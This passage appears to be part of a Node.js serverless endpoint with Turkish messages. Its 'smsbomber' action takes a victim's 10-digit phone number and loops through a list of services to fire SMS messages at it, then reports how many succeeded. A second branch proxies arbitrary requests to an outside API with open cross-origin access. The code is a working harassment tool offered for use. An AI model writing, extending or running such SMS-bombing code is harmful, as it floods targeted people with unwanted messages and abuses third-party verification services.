        if (attempt < retries) await new Promise(r => setTimeout(r, 200));
    }
    return { service: name, success: false, message: lastError };
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        const query = req.query || {};
        const { action, phone, endpoint, ...params } = query;

        if (action === 'smsbomber') {
            if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
            if (!/^\d{10}$/.test(phone)) return res.status(400).json({ error: 'Telefon numarası 10 haneli olmalı (örn: 5551234567).' });

            const results = [];
            for (const name of Object.keys(services)) {
                const r = await tryService(name, phone, 1);
                results.push(r);
            }

            const basarili = results.filter(r => r.success).length;
            return res.status(200).json({
                total: results.length,
                basarili,
                basarisiz: results.length - basarili,
                results
            });
        }

        if (!endpoint) return res.status(400).json({ error: 'Endpoint belirtilmedi.' });

        try {
            const url = new URL(`https://api.ajaxsystems.fun/${endpoint}`);
            Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v));
            const r = await getJson(url.toString());
            return res.status(200).json(r.data);
        } catch (error) {
            return res.status(200).json({ error: error.message || 'API isteği başarısız oldu.' });
        }

    } catch (globalError) {
        console.error('[PROXY GLOBAL HATA]', globalError);
        return res.status(500).json({ error: 'Sunucu hatası: ' + (globalError.message || 'Bilinmeyen hata') });
    }
};
